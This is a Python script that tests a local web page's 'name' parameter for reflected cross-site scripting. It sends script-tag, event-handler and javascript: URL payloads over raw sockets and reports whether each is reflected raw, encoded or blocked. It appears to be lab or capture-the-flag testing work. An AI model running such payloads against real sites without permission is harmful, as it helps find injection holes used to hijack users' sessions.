import socket
import urllib.parse
import time

def make_request(path):
    """Make HTTP request using raw socket"""
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(20)
        
        # Connect
        sock.connect(('127.0.0.1', 33081))
        
        # Create HTTP request
        request = f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
        sock.send(request.encode())
        
        # Read response
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
        
    except Exception as e:
        return f"ERROR: {str(e)}"

# Test each payload category
print("XSS Context Analysis - Testing Payload Reflection")
print("Target: http://127.0.0.1:33081/page?name=PAYLOAD\n")

test_cases = [
    ("Plain Text", "Test123"),
    ("HTML Tag", "<b>BOLD</b>"),
    ("Script Tag", "<script>alert(1)</script>"),
    ("Event Handler", '<img src=x onerror=alert(1)>'),
    ("Attribute Injection", '" onload=alert(1)>'),
    ("JS Protocol", '<a href="javascript:alert(1)">link</a>'),
    ("Special Chars", "<>\"'&"),
    ("Mixed XSS", '<img src=x onError=alert("XSS")>')
]

results = []

for name, payload in test_cases:
    print(f"Testing {name}: {payload}")
    
    # URL encode the payload
    encoded = urllib.parse.quote(payload, safe='')
    path = f"/page?name={encoded}"
    
    # Make request with delay between tests
    response = make_request(path)
    time.sleep(1)
    
    # Simple result analysis
    if "ERROR" in response:
        print(f"  Connection Error: {response}")
        result = "ERROR"
    elif payload in response:
        print(f"  ✓ REFLECTED (RAW)")
        idx = response.find(payload)
        snippet = response[max(0, idx-80):idx+len(payload)+80]
        print(f"  Context: {snippet[:200]}")
        result = "RAW_REFLECTION"
    elif payload.replace('<', '&lt;') in response and payload.replace('>', '&gt;') in response:
        print(f"  ✓ REFLECTED (HTML ENCODED)")
        result = "HTML_ENCODED"
    else:
        print(f"  ✗ NOT REFLECTED (blocked)")
        result = "BLOCKED"
    
    results.append((name, payload, result))
    print("-" * 70)

print("\nSUMMARY:")
for name, payload, result in results:
    status = { "RAW_REFLECTION": "✓ RAW", "HTML_ENCODED": "✓ ENCODED", "BLOCKED": "✗ BLOCKED", "ERROR": "! ERROR" }
    print(f"{name:20s}: {status[result]:<12s} | {payload[:50]}")

print(f"\nTested {len(results)} payloads across {len(set([r[2] for r in results]))} result types")
